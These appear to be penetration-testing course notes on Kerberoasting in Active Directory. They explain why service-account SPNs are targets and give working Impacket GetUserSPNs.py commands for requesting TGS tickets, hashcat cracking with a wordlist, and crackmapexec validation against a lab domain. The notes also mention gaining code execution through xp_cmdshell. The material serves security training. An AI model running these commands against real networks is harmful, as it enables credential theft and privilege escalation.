## Kerberoasting Overview

Kerberoasting targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE any domain user can ask a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All we need for Kerberoasting attack is an account's clear text password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain joined host.

Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Service accounts often require elevated privileges on various systems, so they are added to privileged groups, directly or with nested membership. Finding SPNs associated with privileged account is common. Kerberos ticket for an account with SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account's NTLM hash, so we can attempt to crack the hash.

Weak or reused passwords for service accounts are common to simplify administration, and sometimes the password is the same as the username. The password for a domain SQL server, will probably give you admin on multiple servers, if not domain admin. Even if it gives us low-privileged access, we can use it to craft service tickets for service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.

## Kerberoasting - Performing the Attack

Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.

Several tools can be utilized to perform the attack:

- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

TGS tickets take longer to crack then other formats such as NTLM hashes, so often it can be difficult or impossible to obtain the cleartext password.

## Efficacy of the Attack

Kerberoasting and the presence of SPNs don't guarantee us any level of access. The attack can give us privileged access, low privileges access even with retrieving multiple TGS tickets, or no further access at all. The first 2 would be high risk, while the third can be medium since the password might change to something weak, or it can be cracked by a determined attacker.

## Performing the Attack

### Kerberoasting with GetUserSPNs.py

A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.

To install Impacket we can first clone the repository from here, then cd to the directory and install it.

#### Installing Impacket Using Pip
```shell-session
$ sudo python3 -m pip install .
```

To gather a list of SPNs in the domain we need a set of valid domain credentials, and the IP of a DC. For authentication we can use cleartext password, NTLM hash, or even a Kerberos ticket.

#### Listing SPN Accounts with GetUserSPN.py
```shell-session
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

We can use the `-request` to pull all TGS tickets for offline processing.

#### Requesting all TGS Tickets
```shell-session
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

#### Requesting a Single TGS Ticket
```shell-session
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

#### Saving the TGS Ticket to an Output File
```shell-session
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

#### Cracking the Ticket Offline with Hashcat
```shell-session
$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

Now we can try to authenticate to confirm our access.

#### Testing Authentication Against a Domain Controller
```shell-session
$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

